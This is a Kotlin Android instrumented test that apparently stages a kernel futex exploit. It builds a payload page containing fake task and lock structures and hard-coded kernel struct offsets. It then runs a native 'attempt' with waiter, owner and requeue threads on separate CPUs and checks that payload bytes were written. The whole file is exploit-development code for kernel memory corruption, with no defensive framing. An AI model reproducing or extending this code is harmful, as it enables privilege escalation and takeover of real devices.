package com.ghostlock.app

import android.util.Log
import androidx.test.ext.junit.runners.AndroidJUnit4
import com.ghostlock.app.engine.ktstep.KernelFutexWords
import com.ghostlock.app.engine.ktstep.NativeAttemptParams
import com.ghostlock.app.engine.ktstep.NativeAttemptResult
import com.ghostlock.app.engine.ktstep.NativeJniAttemptPort
import com.ghostlock.app.engine.ktstep.NativeKernelSyscalls
import com.ghostlock.app.engine.ktstep.PayloadPageInputs
import com.ghostlock.app.engine.ktstep.PayloadSlots
import com.ghostlock.app.engine.ktstep.SyscallResult
import com.ghostlock.app.engine.ktstep.WriteLayout
import com.ghostlock.app.engine.ktstep.WriteMode
import com.ghostlock.app.engine.ktstep.WriteRequest
import com.ghostlock.app.engine.ktstep.buildPayloadPage
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith

/** N3 staging：discover 候选 + 页 bytes + C++ attempt；不声明 root。 */
@RunWith(AndroidJUnit4::class)
class N3StagingInstrumentedTest {
    @Test
    fun pageBytesAndAttemptUseTheDiscoveredAliasCandidate() {
        val syscalls = NativeKernelSyscalls()
        val words = when (val made = KernelFutexWords.create(syscalls, waitTimeoutNs = -1L)) {
            is com.ghostlock.app.engine.ktstep.FutexWordsResult.Ok -> made.words
            is com.ghostlock.app.engine.ktstep.FutexWordsResult.Errno -> error("words:" + made.code)
        }
        val page = ByteArray(0x4000)
        val pageMap = when (val mapped = syscalls.mmap(
            0x4000L,
            KernelFutexWords.PROT_READ or KernelFutexWords.PROT_WRITE,
            KernelFutexWords.MAP_PRIVATE or KernelFutexWords.MAP_ANONYMOUS,
            -1,
            0L,
        )) {
            is SyscallResult.Ok -> mapped.value
            is SyscallResult.Errno -> error("page-map:" + mapped.code)
        }
        val inputs = PayloadPageInputs(
            slots = PayloadSlots(0x0E80, 0x1180, 0x1280, 0x1080, 0x0F80),
            lock = com.ghostlock.app.engine.ktstep.LockFields(0, 8, 16, 24),
            waiter = com.ghostlock.app.engine.ktstep.WaiterFields(0, 8, 16, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x44, 0x48, 0x50),
            task = com.ghostlock.app.engine.ktstep.TaskFields(0x40, 0x84, 0x8C, 0x90C, 0x920, 0x930, 0x938, 0x348),
            values = com.ghostlock.app.engine.ktstep.PayloadValues(0x100, 120, 140),
            waiterWord = 0x1111L,
            waiterTask = 0L,
            fakeTask = 0x2222L,
            fakeLock = 0x3333L,
            taskGroup = 0L,
            piTopTask = 0L,
            pointerBytes = 8,
        )
        val request = WriteRequest(0x1000L, WriteMode.Zero, true)
        val layout = WriteLayout(0x0FF8L, 0x10000010001L, 0L, false)
        assertEquals(com.ghostlock.app.engine.ktstep.LayoutVerdict.Ok, buildPayloadPage(page, inputs, request, layout))

        val port = NativeJniAttemptPort()
        assertEquals(SyscallResult.Ok(1L), port.open())
        val result = port.attempt(
            NativeAttemptParams(
                chainAddress = words.chain.address,
                waitAddress = words.wait.address,
                targetAddress = words.target.address,
                pageSinkAddress = pageMap,
                chainValue = 0,
                waitValue = 0,
                targetValue = 0,
                page = page,
                pointerBytes = 8,
                parkTimeoutNs = -1L,
                joinTimeoutMs = 3_000,
                settleUs = 500,
                waiterCpu = 0,
                ownerCpu = 1,
                requeueCpu = 2,
                waiterNice = 0,
                ownerNice = 0,
                requeueNice = 0,
                policy = 0,
            ),
        )
        port.close()
        syscalls.munmap(pageMap, 0x4000L)
        words.close()

        Log.i(TAG, "n3-result=" + result)
        assertTrue(result is NativeAttemptResult.Ok)
        val answer = result as NativeAttemptResult.Ok
        assertTrue(answer.pageBytesWritten > 0)
        assertTrue(answer.actorsStarted)
    }

    private companion object {
        const val TAG = "N3Staging"
    }
}
